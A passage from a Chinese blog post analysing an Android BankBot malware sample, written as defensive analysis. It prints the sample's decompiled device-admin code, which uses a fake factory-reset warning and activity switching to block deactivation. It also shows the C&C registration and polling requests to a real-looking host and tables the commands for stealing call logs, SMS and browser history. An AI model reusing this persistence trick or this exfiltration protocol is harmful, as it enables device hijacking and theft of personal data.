class="number">0xA</span>) &#123;</span><br><span class="line">            <span class="type">Intent</span> <span class="variable">v2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;android.settings.SETTINGS&quot;</span>);</span><br><span class="line">            v2.setFlags(<span class="number">0x50000000</span>);</span><br><span class="line">            context.startActivity(v2);</span><br><span class="line">            <span class="type">Intent</span> <span class="variable">v4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;android.intent.action.MAIN&quot;</span>);</span><br><span class="line">            v4.addCategory(<span class="string">&quot;android.intent.category.HOME&quot;</span>);</span><br><span class="line">            v4.setFlags(<span class="number">0x10000000</span>);</span><br><span class="line">            context.startActivity(v4);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;WARNING! Your device will now reboot to factory settings.\n\nClick \&quot;Yes\&quot; to erase your data and continue. \&quot;No\&quot; for cancel.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        context.startService(<span class="keyword">new</span> <span class="title class_">Intent</span>(context, ASec.class));</span><br><span class="line">        <span class="type">long</span> <span class="variable">v6</span> <span class="operator">=</span> <span class="number">0x7D0</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(v6);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(InterruptedException v3) &#123;</span><br><span class="line">            v3.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;WARNING! Your device will now reboot to factory settings.\n\nClick \&quot;Yes\&quot; to erase your data and continue. \&quot;No\&quot; for cancel.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重写 DeviceAdminReceiver 的 onDisableRequest 方法。使用 Thread.sleep 方法使用户<br>无法操作界面，在此期间采取 Activity 切换的方法绕开取消激活的步骤。</p>
<p>这里出过几个问题，</p>
<ol>
<li>Backdoor.AndroidOS.Obad.a 使用的，在设备管理器中隐身</li>
<li>就是现在代码中所用到这个，目前在所有的Android 版本中存在。</li>
</ol>
<h3 id="界面劫持"><a href="#界面劫持" class="headerlink" title="界面劫持"></a>界面劫持</h3><p>通过界面劫持，诱使用户将App设置为设备管理器。从下图中可以看见Continues按钮其实<br>是设备管理器的激活按钮。</p>
<h2 id="使用翠鸟对恶意样本进行检查的结果"><a href="#使用翠鸟对恶意样本进行检查的结果" class="headerlink" title="使用翠鸟对恶意样本进行检查的结果"></a>使用翠鸟对恶意样本进行检查的结果</h2><h2 id="0x02-C-amp-C-协议分析"><a href="#0x02-C-amp-C-协议分析" class="headerlink" title="0x02 C&amp;C 协议分析"></a>0x02 C&amp;C 协议分析</h2><p>Bankbot 以固定时间轮询的方式向C&amp;C服务器请求命令，命令的格式为json格式。从代码中<br>可以得到json字段的信息。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_ACTION</span> <span class="operator">=</span> <span class="string">&quot;action&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_CALL_LOG</span> <span class="operator">=</span> <span class="string">&quot;call_log&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_DATA</span> <span class="operator">=</span> <span class="string">&quot;data&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_HISTORY</span> <span class="operator">=</span> <span class="string">&quot;browser_history&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_ID</span> <span class="operator">=</span> <span class="string">&quot;id&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_IMEI</span> <span class="operator">=</span> <span class="string">&quot;imei&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_INTERCEPT</span> <span class="operator">=</span> <span class="string">&quot;intercept&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_MAYHEM</span> <span class="operator">=</span> <span class="string">&quot;mayhem&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_MESSAGE</span> <span class="operator">=</span> <span class="string">&quot;prefix_1&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_NEW_SERVER</span> <span class="operator">=</span> <span class="string">&quot;server&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_NUMBER_SEND_TO</span> <span class="operator">=</span> <span class="string">&quot;number_1&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_OPERATOR</span> <span class="operator">=</span> <span class="string">&quot;op&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_PHONE</span> <span class="operator">=</span> <span class="string">&quot;phone&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_POLL_INTERVAL</span> <span class="operator">=</span> <span class="string">&quot;server_poll&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_PREFIX</span> <span class="operator">=</span> <span class="string">&quot;prefix&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_REPORT_CALLS</span> <span class="operator">=</span> <span class="string">&quot;calls&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_SMS_HISTORY</span> <span class="operator">=</span> <span class="string">&quot;sms_history&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_SPAM</span> <span class="operator">=</span> <span class="string">&quot;text_2&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_STATUS</span> <span class="operator">=</span> <span class="string">&quot;status&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_URL_TO_SHOW</span> <span class="operator">=</span> <span class="string">&quot;url&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FIELD_VERSION</span> <span class="operator">=</span> <span class="string">&quot;version&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="请求注册"><a href="#请求注册" class="headerlink" title="请求注册"></a>请求注册</h3><p>返回报文</p>
<p>401</p>
<h3 id="注册报文"><a href="#注册报文" class="headerlink" title="注册报文"></a>注册报文</h3><p>请求报文</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /p/gate.php HTTP/1.1</span><br><span class="line">Content-Length: 106</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Host: quick-sshopping.com</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line"></span><br><span class="line">action=reg&amp;imei=098767899076562&amp;phone=15802920457&amp;op=Android&amp;version=4.4.4%2C3.4.0-gd853d22&amp;prefix=12Jhw21</span><br></pre></td></tr></table></figure>

<p>响应报文</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.8.0</span><br><span class="line">Date: Tue, 23 Feb 2016 07:25:21 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Connection: keep-alive</span><br><span class="line">X-Powered-By: PHP/5.5.31</span><br><span class="line"></span><br><span class="line">3</span><br><span class="line">200</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h3 id="获取命令"><a href="#获取命令" class="headerlink" title="获取命令"></a>获取命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /p/gate.php HTTP/1.1</span><br><span class="line">Content-Length: 32</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Host: quick-sshopping.com</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line"></span><br><span class="line">action=poll&amp;imei=098767899076562</span><br></pre></td></tr></table></figure>


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.8.0</span><br><span class="line">Date: Tue, 23 Feb 2016 07:25:30 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Connection: keep-alive</span><br><span class="line">X-Powered-By: PHP/5.5.31</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>返回的命令为json 格式，主要的指令有下面几个，</p>
<table>
<thead>
<tr>
<th>指令</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>401</td>
<td>要求 bot 注册</td>
</tr>
<tr>
<td>call_log</td>
<td>获取电话记录, 发送到C&amp;C server</td>
</tr>
<tr>
<td>sms_history</td>
<td>获取短信内容，发送到C&amp;C server</td>
</tr>
<tr>
<td>browser_history</td>
<td>获取浏览器书签，发送到C&amp;C server</td>
</tr>
<tr>
<td>url</td>
<td>访问url 链接</td>
</tr>
<tr>
<td>server</td>
<td>更换C&amp;C server</td>
</tr>
<tr>
<td>intercept</td>
<td></td>
</tr>
<tr>
<td>server_poll</td>
<td>更新从服务器获取命令的时间间隔</td>
</tr>
<tr>
<td>mayhem</td>
<td></td>
</tr>
<tr>
<td>calls</td>
<td></td>
</tr>
</tbody></table>
<p>监视服务了大半天，没有收到有效指令，看来不是特别活跃。</p>
<h2 id="0x03清除"><a href="#0x03清除" class="headerlink" title="0x03清除"></a>0x03清除</h2><p>这个App的清除非常费劲，原因就是注册为设备管理器的app不能卸载，而这个App又使诈<br>不让我们取消设备管理器，估计只有root的机器会好处理一些。</p>
<h2 id="0x04总结"><a href="#0x04总结" class="headerlink" title="0x04总结"></a>0x04总结</h2><p>BankBot 样本，代码编写的相当规范，风格严谨，是正规程序员的作品。但行为非常流氓，<br>很顽固，不容易清除。所以遇到申请device admin 权限的程序一定要小心谨慎，以免不良<br>后果。而Android的界面劫持也是一个严重的问题，估计后续利用这些技术的恶意App的数量<br>会越来越多。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">henices</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

    </div>
  </footer>

  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  





  





</body>
</html>
